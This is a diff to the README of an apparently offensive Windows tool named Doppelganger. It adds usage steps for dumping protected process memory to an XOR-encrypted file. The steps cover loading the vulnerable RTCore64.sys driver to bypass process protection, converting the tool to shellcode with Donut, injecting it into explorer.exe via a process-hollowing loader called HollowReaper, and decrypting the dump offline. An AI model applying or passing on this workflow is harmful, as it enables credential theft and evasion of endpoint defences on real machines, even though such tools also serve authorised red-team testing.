@@ -32,15 +32,30 @@ A local decryption utility. Use this to restore the original dump from its XOR-o
 | RTCore64.sys | Vulnerable driver used for PPL bypass (BYOVD) |
 
 ## 🕯️ Usage Flow
+### Standalone
+In order to use Doppelganger you must place RTCore64.sys in C:\Users\Public. Doppleganger can be used standalone or hollowed through HollowReaper.
+```
+.\Doppelganger.exe
+```
+--------------------------------------------------------------------------------
+### Process Hollowed
+
 1️⃣ Compile Doppelganger
 
 2️⃣ Use Donut to convert it into shellcode
-
+```
+.\donut.exe -a 2 -f 7 -i Doppelganger.exe
+```
 3️⃣ Embed the shellcode into HollowReaper.c
 
-4️⃣ Run HollowReaper to hollow a process and trigger Doppelganger
-
+4️⃣ Run HollowReaper to hollow a process and trigger Doppelganger (all files saved to C:\Users\Public)
+```
+.\HollowReaper.exe "C:\windows\explorer.exe"
+```
 5️⃣ Use decrypt_xor_dump.py to decrypt the dumped file offline
+```
+python .\decrypt_xor_dump.py .\doppelganger.dmp
+```
 
 ---------------------------------------------------------------------------------
 
